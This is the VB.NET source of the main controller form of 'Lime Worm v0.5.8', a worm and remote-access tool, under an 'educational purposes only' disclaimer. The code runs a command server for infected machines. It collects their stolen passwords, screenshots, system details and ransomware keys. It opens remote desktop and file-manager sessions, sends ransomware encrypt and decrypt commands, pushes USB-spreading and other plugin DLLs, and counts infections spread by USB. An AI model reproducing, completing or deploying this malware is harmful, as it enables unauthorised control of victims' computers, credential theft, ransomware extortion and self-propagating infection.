
'##################################################################
'##        N Y A N   C A T  |||   Updated on May./07/2018        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                     .. Lime Worm v0.5.8 ..                   ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################
'##           https://github.com/NYAN-x-CAT/Lime-Worm            ##
'##################################################################
'##  This software's main purpose is NOT to be used maliciously  ##
'##################################################################
'## I am not responsible For any actions caused by this software ##
'##################################################################




Imports System.Net.Sockets
Imports Mono.Cecil
Imports Mono.Cecil.Cil

Public Class Form1
    Public WithEvents S As S_Socket
    Public SPL As String = "|'L'|"
    Private m_SortingColumn As ColumnHeader
    Public Shared F As Form1
    Public Shared MYPORT As Integer
    Public Shared MYPASS As String = String.Empty
    Public Shared MYIP As String = String.Empty





#Region "Form Events"

    Sub New()

        ' This call is required by the designer.
        InitializeComponent()

        ' Add any initialization after the InitializeComponent() call.
        Try

            If Not IO.Directory.Exists(Application.StartupPath + "\" + "Wallpaper") Then
                IO.Directory.CreateDirectory(Application.StartupPath + "\" + "Wallpaper")
            End If

            If Not IO.Directory.Exists(Application.StartupPath + "\" + "Stub") Then
                IO.Directory.CreateDirectory(Application.StartupPath + "\" + "Stub")
            End If

            If Not IO.Directory.Exists(Application.StartupPath + "\" + "Plugin") Then
                IO.Directory.CreateDirectory(Application.StartupPath + "\" + "Plugin")
            End If

            If Not IO.File.Exists(Application.StartupPath + "\" + "Wallpaper" + "\" + "Lime's wallpaper.jpg") Then
                My.Resources.Lime_s_wallpaper.Save(Application.StartupPath + "\" + "Wallpaper" + "\" + "Lime's wallpaper.jpg", Imaging.ImageFormat.Jpeg)
            End If

        Catch ex As Exception
        End Try

    End Sub
    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        My.Settings.Save()
        Try
            NotifyIcon1.Dispose()
            Application.Exit()
            End
        Catch : End Try
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Me.Load
        Control.CheckForIllegalCrossThreadCalls = False
#If DEBUG Then

        MYPORT = 8989
        MYPASS = "NYANCAT"
        Try
            S = New S_Socket(MYPORT)
        Catch ex As Exception
            MsgBox(ex.Message)
            End
        End Try
#Else

        Try
re:
            MYPORT = InputBox("Select Port", "", My.Settings.port)
            MYPASS = InputBox("Select Password", "", My.Settings.pass)
            If Not MYPASS = String.Empty Then
                S = New S_Socket(MYPORT)
                My.Settings.port = MYPORT
                My.Settings.pass = MYPASS
            Else
                GoTo re
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
            End
        End Try
#End If
        BackgroundWorker1.RunWorkerAsync()
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork

        ContextMenuStrip1.Renderer = New MyRenderer()

        Me.Text = "Lime Worm v0.5.8"

        If ToolStripStatusLabel2.Text.Contains("OFF") Then
            ToolStripStatusLabel2.ForeColor = Color.Red
        End If

        EXE.Enabled = False
        PATH1.Enabled = False
        DROP.Checked = False
        PATH2.Enabled = False
        Injection_CHK.Enabled = False

        Dim Client As TcpClient = Nothing
        Try
            Client = New TcpClient
            Client.Connect(GetExternalAddress, MYPORT)
            ToolStripStatusLabel3.Text = "LISTENING [" & GetExternalAddress() & " @" & MYPORT & " #" & MYPASS & "]"
            ToolStripStatusLabel3.ForeColor = Color.Lime
        Catch ex As SocketException
            ToolStripStatusLabel3.Text = "CLOSED [" & GetExternalAddress() & "  @" & MYPORT & "  #" & MYPASS & "]"
            ToolStripStatusLabel3.ForeColor = Color.Red
        Finally
            Client.Close()
        End Try

    End Sub

#End Region


#Region "Server Events"
    Private Sub S_Disconnected(ByVal u As USER) Handles S.Disconnected
        SyncLock L1.Items
            Try
                u.L.Remove()
                Messages("{" + u.IP.Split(":")(0) + "}", "Disconnected")
            Catch ex As Exception
            End Try
        End SyncLock
    End Sub

    Private Sub S_Connected(ByVal u As USER) Handles S.Connected

    End Sub
    Private Shared _Gio As New S_GIO(Application.StartupPath & "\GIO.dat")
    Delegate Sub _Data(ByVal u As USER, ByVal b() As Byte)
    Private Sub S_Data(ByVal u As USER, ByVal b() As Byte) Handles S.Data
        Dim A As String() = Split(S_Encryption.AES_Decrypt(BS(b)), SPL)

        Try
            Select Case A(0)

                Case "info" ' Client Sent me PC name
                    SyncLock L1.Items
                        u.L = L1.Items.Add(_Gio.LookupCountryName(u.IP.Split(":")(0)), _Gio.LookupCountryCode(u.IP.Split(":")(0)) & ".png")
                        u.L.Tag = u
                        u.L.SubItems.Add(u.IP.Split(":")(0))
                        For i As Integer = 1 To A.Length - 1
                            u.L.SubItems.Add(A(i))
                        Next

                        If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", u.L.SubItems(2).Text + "_" + u.L.SubItems(3).Text, Nothing) IsNot Nothing Then
                            u.L.ForeColor = ColorTranslator.FromHtml(My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", u.L.SubItems(2).Text + "_" + u.L.SubItems(3).Text, Nothing))
                        End If
                        Messages("{" + u.IP.Split(":")(0) + "}", "Connected")
                        Fix()

                        If ToolStripStatusLabel2.Text = ("       NOTIFICATION [ON]") Then
                            NotifyIcon1.BalloonTipIcon = ToolTipIcon.None
                            NotifyIcon1.BalloonTipText = "User: " + A(2) + vbNewLine + "IP: " + u.IP.Split(":")(0)
                            NotifyIcon1.BalloonTipTitle = "Lime Worm | New Connection!"
                            NotifyIcon1.ShowBalloonTip(600)
                        End If
                    End SyncLock

                Case "ping" ' ping
                    SyncLock L1.Items
                        u.IsPinged = False
                        u.L.SubItems(PING.Index).Text = u.MS & "ms"
                        u.MS = 0
                    End SyncLock

                Case "!R"
                    SyncLock L1.Items
                        u.L.SubItems(Rans.Index).Text = A(1).ToString
                    End SyncLock
                    Fix()

                Case "!U"
                    SyncLock L1.Items
                        If A(1).ToString.Contains("Spreaded!") Then
                            u.L.BackColor = Color.DarkGreen
                            u.L.SubItems(USB.Index).Text = "Just Spreaded!"
                        Else
                            u.L.SubItems(USB.Index).Text = A(1).ToString
                        End If
                    End SyncLock
                    Fix()

                Case "!" ' i recive size of client screen
                    ' lets start Cap form and start capture desktop
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim _RDP As RDP = My.Application.OpenForms("!" + u.IP.Split(":")(0))

                    If _RDP Is Nothing Then
                        _RDP = New RDP
                        _RDP.F = Me
                        _RDP.u = u
                        _RDP.Name = "!" + u.IP.Split(":")(0)
                        _RDP.Sz = New Size(A(1), A(2))
                        _RDP.Show()
                    End If

                Case "@" ' i recive image  
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If
                    Dim _RDP As RDP = My.Application.OpenForms("!" + u.IP.Split(":")(0))
                    If _RDP IsNot Nothing Then
                        If A(1).Length = 1 Then
                            If _RDP.Button1.Text = "Stop" Then
                                S.Send(u, "@" & SPL & _RDP.C1.SelectedIndex & SPL & _RDP.C2 & SPL & _RDP.C.Value)
                            End If
                            Exit Sub
                        End If
                        _RDP.PktToImage(SB(A(1)))
                    End If

                Case "MSG"
                    Messages("{" + u.IP.Split(":")(0) + "}", A(1).ToString)

                Case "Key"
                    IO.File.WriteAllText(uFolder(A(1), "KEY.txt"), A(2))

                Case "DEL-KEY"
                    IO.File.Delete(uFolder(A(1), "KEY.txt"))

                Case "SC"
                    IO.File.WriteAllBytes(uFolder(A(1), "SC.jpeg"), Convert.FromBase64String(A(2)))

                Case "OFM"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim FM As Filemanager = My.Application.OpenForms("FM" + u.IP.Split(":")(0))
                    If FM Is Nothing Then
                        FM = New Filemanager
                        FM.F = Me
                        FM.U = u
                        FM.Name = "FM" + u.IP.Split(":")(0)
                        FM.Text = "FM " + u.IP.Split(":")(0)
                        FM.Show()
                    End If

                Case "FM"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim FM As Filemanager = My.Application.OpenForms("FM" & u.IP.Split(":")(0))
                    If FM IsNot Nothing Then


                        If A(1) = "Error " Then
                            FM.BackToolStripMenuItem.PerformClick()
                            FM.ToolStripStatusLabel1.Text = A(2)
                        Else
                            FM.ListView1.Items.Clear()
                            Dim allFiles As String() = Split(A(1), "|SPL_FM|")
                            For i = 0 To allFiles.Length - 2
                                Dim itm As New ListViewItem
                                itm.Text = allFiles(i)
                                itm.SubItems.Add(allFiles(i + 1))
                                If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
                                    Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                    If fsize > 1073741824 Then
                                        Dim size As Double = fsize / 1073741824
                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                    ElseIf fsize > 1048576 Then
                                        Dim size As Double = fsize / 1048576
                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                    ElseIf fsize > 1024 Then
                                        Dim size As Double = fsize / 1024
                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                    Else
                                        itm.SubItems(1).Text = fsize.ToString & " B"
                                    End If
                                    itm.Tag = Convert.ToInt64(allFiles(i + 1))
                                End If
                                If itm.Text.StartsWith("[Drive]") Then
                                    itm.ImageIndex = 0
                                    itm.Text = itm.Text.Substring(7)
                                ElseIf itm.Text.StartsWith("[CD]") Then
                                    itm.ImageIndex = 1
                                    itm.Text = itm.Text.Substring(4)
                                ElseIf itm.Text.StartsWith("[Folder]") Then
                                    itm.ImageIndex = 2
                                    itm.Text = itm.Text.Substring(8)
                                ElseIf itm.Text.EndsWith(".exe") Then
                                    itm.ImageIndex = 3
                                ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".bmp") Then
                                    itm.ImageIndex = 4
                                ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".txt") Then
                                    itm.ImageIndex = 5
                                ElseIf itm.Text.EndsWith(".dll") Then
                                    itm.ImageIndex = 6
                                ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".rar") Then
                                    itm.ImageIndex = 7
                                ElseIf itm.Text.EndsWith(".wav") Then
                                    itm.ImageIndex = 9
                                ElseIf itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".mb4") Or itm.Text.EndsWith(".flv") Or itm.Text.EndsWith(".3gp") Then
                                    itm.ImageIndex = 11
                                ElseIf itm.Text.EndsWith(".mp3") Then
                                    itm.ImageIndex = 12
                                ElseIf itm.Text.EndsWith(".html") Or itm.Text.EndsWith(".Php") Or itm.Text.EndsWith(".xml") Then
                                    itm.ImageIndex = 10
                                ElseIf itm.Text.EndsWith(".rar") Then
                                    itm.ImageIndex = 13
                                ElseIf itm.Text.EndsWith(".Lime") Then
                                    itm.ForeColor = Color.Lime
                                    itm.ImageIndex = 14
                                Else
                                    itm.ImageIndex = 8
                                End If
                                FM.ListView1.Items.Add(itm)
                                i += 1
                            Next
                        End If
                    End If
                Case "PWD+"

                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim P As PWD = My.Application.OpenForms("PWD")
                    If P Is Nothing Then
                        P = New PWD
                        P.F = Me
                        P.U = u
                        P.Name = "PWD"
                        P.Text = " Passwords"
                        P.Show()
                    End If

                    'duplicate 
                    Try
                        For Each listItem As ListViewItem In P.ListView1.Items
                            If listItem.SubItems.Item(0).Text.TrimStart.TrimEnd = A(2) Then
                                Exit Select
                            End If
                        Next
                    Catch ex As Exception
                    End Try

                    Try
                        Dim aa As String() = Split(A(1), "~|~")
                        For i = 2 To aa.Length
                            Dim ii As New ListViewItem
                            ii.Text = aa(i)
                            ii.SubItems.Add(aa(i + 2))
                            ii.SubItems.Add(aa(i + 4))
                            ii.SubItems.Add(aa(i + 6))
                            ii.SubItems.Add(aa(i + 8))
                            P.ListView1.Items.Add(ii)
                            i += 9
                        Next
                    Catch ex As Exception
                    End Try

                    IO.File.WriteAllText(uFolder(A(2), "PASS.txt"), A(1))

                Case "SysInfo"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim n As SysInfo = My.Application.OpenForms("Info" + u.IP.Split(":")(0))
                    If n Is Nothing Then
                        n = New SysInfo
                        n.F = Me
                        n.U = u
                        n.Name = "Info" + u.IP.Split(":")(0)
                        n.Text = "System Info " + u.IP.Split(":")(0)
                        n.Show()
                    End If

                    Dim GW As New ListViewGroup("Windows", HorizontalAlignment.Left)
                    Dim GU As New ListViewGroup("User", HorizontalAlignment.Left)
                    Dim GS As New ListViewGroup("Specifications", HorizontalAlignment.Left)
                    Dim GL As New ListViewGroup("Worm", HorizontalAlignment.Left)
                    Dim GM As New ListViewGroup("MISC", HorizontalAlignment.Left)

                    Try
                        With n.ListView1
                            .Clear()
                            .FullRowSelect = True
                            .View = View.Details
                            .Columns.Add("")
                            .Columns.Add("")
                            .HeaderStyle = ColumnHeaderStyle.None

                            .Groups.Add(GU)
                            .Groups.Add(GW)
                            .Groups.Add(GS)
                            .Groups.Add(GL)
                            .Groups.Add(GM)
                        End With
                    Catch ex As Exception
                    End Try

                    With n.ListView1.Items
                        .Add(New ListViewItem("Computer Name: ", GU)).SubItems.Add(A(1))

                        .Add(New ListViewItem("User Name: ", GU)).SubItems.Add(A(2))
                        .Add(New ListViewItem("Worm ID: ", GU)).SubItems.Add(A(20))


                        .Add(New ListViewItem("Windows Name: ", GW)).SubItems.Add(A(4))
                        .Add(New ListViewItem("Windows Version: ", GW)).SubItems.Add(A(5))
                        .Add(New ListViewItem("Windows Architecture: ", GW)).SubItems.Add(A(6))
                        .Add(New ListViewItem("Product Key: ", GW)).SubItems.Add(A(7))


                        .Add(New ListViewItem("Machine Type: ", GS)).SubItems.Add(A(17))
                        .Add(New ListViewItem("DotNET Framework: ", GS)).SubItems.Add(A(18))
                        .Add(New ListViewItem("CPU Name: ", GS)).SubItems.Add(A(8))
                        .Add(New ListViewItem("GPU Name: ", GS)).SubItems.Add(A(9))
                        .Add(New ListViewItem("RAM: ", GS)).SubItems.Add(A(10))
                        .Add(New ListViewItem("Screen: ", GS)).SubItems.Add(A(11))
                        .Add(New ListViewItem("Fixed Drivers: ", GS)).SubItems.Add(A(19))
                        .Add(New ListViewItem("Removable Drivers: ", GS)).SubItems.Add(A(23))


                        .Add(New ListViewItem("HOST: ", GL)).SubItems.Add(A(12))
                        .Add(New ListViewItem("PORT: ", GL)).SubItems.Add(A(13))
                        .Add(New ListViewItem("Privilege: ", GL)).SubItems.Add(A(3))
                        .Add(New ListViewItem("Location: ", GL)).SubItems.Add(A(14))

                        .Add(New ListViewItem("Active Window: ", GM)).SubItems.Add("{ " & A(21) & " }")
                        .Add(New ListViewItem("Last Reboot: ", GM)).SubItems.Add(A(15))
                        .Add(New ListViewItem("Anti-Virus: ", GM)).SubItems.Add(A(16))
                        .Add(New ListViewItem("Firewall: ", GM)).SubItems.Add(A(22))
                    End With

                    n.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)


                Case "PROC"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If
                    Dim n As SysInfo = My.Application.OpenForms("Info" + u.IP.Split(":")(0))
                    If n IsNot Nothing Then

                        Try
                            With n.L2
                                .Clear()
                                .View = View.Details
                                .Columns.Add("Process name", 250)
                                .Columns.Add("Process ID", 80)
                                .Columns.Add("Process path", 250)
                                .GridLines = True
                            End With
                        Catch ex As Exception
                        End Try

                        Try
                            Dim PR As String() = Split(A(1), "|'P'|")
                            For i As Integer = 0 To PR.Length
                                With n.L2.Items.Add(PR(i))
                                    .SubItems.Add(PR(i + 1))
                                    .SubItems.Add(PR(i + 2))
                                    i += 2
                                End With
                            Next
                        Catch ex1 As Exception
                        End Try

                        Try
                            For Each x As ListViewItem In n.L2.Items
                                If x.SubItems(2).Text = A(2) Then
                                    x.ForeColor = Color.Lime
                                End If
                            Next
                        Catch ex2 As Exception
                        End Try
                    End If

                    n.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)

                Case "STUP"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If
                    Dim n As SysInfo = My.Application.OpenForms("Info" + u.IP.Split(":")(0))
                    If n IsNot Nothing Then
                        Dim G1 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
                        Dim G2 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\", HorizontalAlignment.Left)
                        Dim G3 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\", HorizontalAlignment.Left)
                        Dim G4 As New ListViewGroup("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
                        Dim G8 As New ListViewGroup("HKEY_LOCAL_MACHINE\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
                        Dim G6 As New ListViewGroup("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", HorizontalAlignment.Left)
                        Dim G5 As New ListViewGroup("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", HorizontalAlignment.Left)
                        Dim G7 As New ListViewGroup("Startup Folder", HorizontalAlignment.Left)

                        Try
                            With n.L3
                                .Clear()
                                .View = View.Details
                                .HeaderStyle = ColumnHeaderStyle.None
                                .Columns.Add("")
                                .Columns.Add("")
                                .GridLines = True
                                .Groups.Add(G1)
                                .Groups.Add(G2)
                                .Groups.Add(G3)
                                .Groups.Add(G4)
                                .Groups.Add(G8)
                                .Groups.Add(G6)
                                .Groups.Add(G5)
                                .Groups.Add(G7)
                                .ShowGroups = True
                                .FullRowSelect = True
                            End With
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(1), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With n.L3.Items
                                    .Add(New ListViewItem(ST(i), G1)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(2), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With n.L3.Items
                                    .Add(New ListViewItem(ST(i), G2)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(3), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With n.L3.Items
                                    .Add(New ListViewItem(ST(i), G3)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(4), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With n.L3.Items
                                    .Add(New ListViewItem(ST(i), G4)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(8), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With n.L3.Items
                                    .Add(New ListViewItem(ST(i), G8)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(6), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With n.L3.Items
                                    .Add(New ListViewItem(ST(i), G6)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(5), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With n.L3.Items
                                    .Add(New ListViewItem(ST(i), G5)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(7), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With n.L3.Items
                                    .Add(New ListViewItem(ST(i), G7)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        n.L3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    End If
                Case "DEC"
                    S.Send(u, "DEC" + SPL + IO.File.ReadAllText(uFolder(A(1), "KEY.txt")))

                Case "ENC"
                    S.Send(u, "ENC" + SPL + RANS_TEXT + SPL + RANS_IMG)

                Case "GPL"
                    Dim Folderx = IO.Directory.GetFiles(Application.StartupPath & "\Plugin")

                    For Each file In Folderx
                        Dim HASH = getMD5Hash(IO.File.ReadAllBytes(file))

                        If HASH = A(1) Then
                            S.Send(u, "IPL" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(file)) + SPL + getMD5Hash(IO.File.ReadAllBytes(file)))
                        End If
                    Next

                Case "PLUSB"
                    S.Send(u, "IPL" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\USB.dll")) + SPL + "_USB")

                Case "PLPIN"
                    S.Send(u, "IPL" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\PIN.dll")) + SPL + "_PIN")

            End Select
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

    End Sub

#End Region


#Region "Logs"

    Public Sub Messages(ByVal user As String, ByVal msg As String)
        L2.Items.Add("[" + DateAndTime.Now.ToString("hh:mm:ss tt") + "]" + "  " + user + "  →  " + msg.ToString)
    End Sub

    Private Sub ListBox1_DrawItem(sender As System.Object, e As System.Windows.Forms.DrawItemEventArgs) Handles L2.DrawItem
        Try
            e.DrawBackground()

            If L2.Items(e.Index).ToString.Contains("Connected") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.Lime, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L2.Items(e.Index).ToString.Contains("Disconnected") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.DarkRed, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L2.Items(e.Index).ToString.Contains("Error!") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.Red, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L2.Items(e.Index).ToString.Contains("Established!") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.LightSteelBlue, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
            Else
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.White, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
            End If
            e.DrawFocusRectangle()
        Catch ex As Exception
        End Try
    End Sub

    Private Sub L2_Click(sender As Object, e As EventArgs) Handles L2.Click
        L2.ClearSelected()
        MAIN_TAB.Focus()
    End Sub
#End Region


#Region "Theme"



    Class ListViewComparer
        Implements IComparer

        Private m_ColumnNumber As Integer
        Private m_SortOrder As SortOrder

        Public Sub New(ByVal column_number As Integer, ByVal _
            sort_order As SortOrder)
            m_ColumnNumber = column_number
            m_SortOrder = sort_order
        End Sub

        ' Compare the items in the appropriate column
        ' for objects x and y.
        Public Function Compare(ByVal x As Object, ByVal y As _
            Object) As Integer Implements _
            System.Collections.IComparer.Compare
            Dim item_x As ListViewItem = DirectCast(x,
                ListViewItem)
            Dim item_y As ListViewItem = DirectCast(y,
                ListViewItem)

            ' Get the sub-item values.
            Dim string_x As String
            If item_x.SubItems.Count <= m_ColumnNumber Then
                string_x = ""
            Else
                string_x = item_x.SubItems(m_ColumnNumber).Text
            End If

            Dim string_y As String
            If item_y.SubItems.Count <= m_ColumnNumber Then
                string_y = ""
            Else
                string_y = item_y.SubItems(m_ColumnNumber).Text
            End If

            ' Compare them.
            If m_SortOrder = SortOrder.Ascending Then
                If IsNumeric(string_x) And IsNumeric(string_y) _
                    Then
                    Return Val(string_x).CompareTo(Val(string_y))
                ElseIf IsDate(string_x) And IsDate(string_y) _
                    Then
                    Return DateTime.Parse(string_x).CompareTo(DateTime.Parse(string_y))
                Else
                    Return String.Compare(string_x, string_y)
                End If
            Else
                If IsNumeric(string_x) And IsNumeric(string_y) _
                    Then
                    Return Val(string_y).CompareTo(Val(string_x))
                ElseIf IsDate(string_x) And IsDate(string_y) _
                    Then
                    Return DateTime.Parse(string_y).CompareTo(DateTime.Parse(string_x))
                Else
                    Return String.Compare(string_y, string_x)
                End If
            End If
        End Function
    End Class

    Private Sub Fix()
        On Error Resume Next
        Me.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub Form1_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        On Error Resume Next
        Fix()
        PictureBox1.Anchor = (AnchorStyles.Bottom + AnchorStyles.Right)
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            ToolStripStatusLabel1.Text = "       ONLINE CLIENTS [" & L1.Items.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        AVAILABLE KEYS TO DECRYPT [" & KeyCount() & "]        TOTAL USB SPREAD [" & SpreadCount() & "]"
        Catch ex As Exception
        End Try
    End Sub


    Public Function KeyCount()
        Try
            If Not IO.Directory.Exists("Users") Then
                IO.Directory.CreateDirectory("Users")
            End If

            Dim fileCount As Integer = IO.Directory.GetFiles("Users", "KEY.txt", IO.SearchOption.AllDirectories).Length
            Return fileCount
        Catch ex As Exception
            Return "0"
        End Try
    End Function

    Public Function SpreadCount()
        Try
            Dim count As Integer = 0
            For Each x As ListViewItem In L1.Items
                If x.SubItems(USB.Index).Text.Contains("Spreaded!") Then
                    count += 1
                End If
            Next
            Return count
        Catch ex As Exception
            Return "0"
        End Try
    End Function


    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
        Try
            If L1.SelectedItems.Count > 0 Then
                For Each x As ListViewItem In L1.SelectedItems
                    PictureBox1.ImageLocation = "Users" + "\" + x.SubItems(3).Text + "_" + x.SubItems(2).Text + "\" + "SC.jpeg"
                    PictureBox1.Visible = True
                Next
            Else
                PictureBox1.Visible = False
            End If
        Catch ex As Exception
            PictureBox1.Visible = False
        End Try
    End Sub

    Private Sub L1_DrawColumnHeader(ByVal sender As Object, ByVal e As DrawListViewColumnHeaderEventArgs) Handles L1.DrawColumnHeader
        Using br = New Drawing.SolidBrush(Drawing.Color.Black)
            e.DrawBackground()
            e.Graphics.FillRectangle(br, e.Bounds)
            Dim headerFont As New Font("Microsoft Sans Serif", 8, FontStyle.Bold)
            e.Graphics.DrawString(e.Header.Text, headerFont, Brushes.Lime, e.Bounds)
        End Using
    End Sub

    Private Sub L1_DrawItem(sender As Object, e As DrawListViewItemEventArgs) Handles L1.DrawItem
        If e.Item.Selected = False Then
            e.DrawDefault = True
        End If
    End Sub

    Private Sub ListViewQuote_DrawSubItem(sender As Object, e As DrawListViewSubItemEventArgs) Handles L1.DrawSubItem
        If e.Item.Selected = True Then
            e.Graphics.FillRectangle(New SolidBrush(Color.Lime), e.Bounds)
            TextRenderer.DrawText(e.Graphics, e.SubItem.Text, New Font("Microsoft Sans Serif", 9, FontStyle.Regular), New Point(e.Bounds.Left + 3, e.Bounds.Top + 2), Color.Black)
        Else
            e.DrawDefault = True
        End If
    End Sub

    Private Sub L1_ColumnClick(ByVal sender As System.Object, ByVal e As ColumnClickEventArgs) Handles L1.ColumnClick
        On Error Resume Next
        ' Get the new sorting column.
        Dim new_sorting_column As ColumnHeader = L1.Columns(e.Column)

        ' Figure out the new sorting order.
        Dim sort_order As System.Windows.Forms.SortOrder
